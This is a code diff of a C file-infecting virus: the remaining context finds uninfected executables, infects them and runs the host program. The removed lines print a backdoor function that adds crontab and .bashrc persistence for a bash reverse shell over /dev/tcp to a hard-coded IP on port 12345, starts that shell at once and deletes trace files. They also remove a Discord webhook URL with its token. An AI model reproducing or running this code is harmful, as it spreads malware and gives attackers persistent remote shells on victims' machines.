@@ -10,11 +10,6 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-#define IP "127.0.0.1"
-#define WEBHOOK                                                                \
-  "https://discord.com/api/webhooks/1485416783706853558/"                      \
-  "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB"
-
 typedef struct {
   char new[1000];
   char old[1000];
@@ -117,40 +112,6 @@ void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
   }
 }
 
-void linux_backdoor() {
-  char *user = getenv("USER");
-  if (!user)
-    user = "unknown";
-
-  // 1. Persistance via crontab user (toutes les 30s)
-  char crontab_cmd[512];
-  snprintf(crontab_cmd, sizeof(crontab_cmd),
-           "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& "
-           "/dev/tcp/" IP
-           "/12345 0>&1\" >/dev/null 2>&1\"') | crontab - >/dev/null 2>&1");
-  system(crontab_cmd);
-
-  // 2. Persistance via .bashrc (au prochain login/terminal)
-  char bashrc_path[256];
-  snprintf(bashrc_path, sizeof(bashrc_path), "/home/%s/.bashrc", user);
-  FILE *f = fopen(bashrc_path, "a");
-  if (f) {
-    fprintf(f, "\n# Backdoor persistence\n"
-               "bash -i >& /dev/tcp/" IP "/12345 0>&1 >/dev/null 2>&1 &\n");
-    fclose(f);
-    chmod(bashrc_path, 0644);
-  }
-
-  // 3. Exécution immédiate (reverse shell bash simple)
-  char shell_cmd[256];
-  snprintf(shell_cmd, sizeof(shell_cmd),
-           "bash -i >& /dev/tcp/" IP "/12345 0>&1 >/dev/null 2>&1 &");
-  system(shell_cmd);
-
-  // Nettoyage traces (optionnel)
-  unlink("/tmp/.pentest.*");
-}
-
 int main(int argc, char *argv[]) {
   char pathbuf[256];
   snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
@@ -159,8 +120,6 @@ int main(int argc, char *argv[]) {
   pg *files = fileFinder(prog_name);
   char *fileUninfected = isInfected(files);
   infect(fileUninfected, prog_name);
-
-  linux_backdoor();
 
   execHost(files, prog_name, argc, argv);
 }
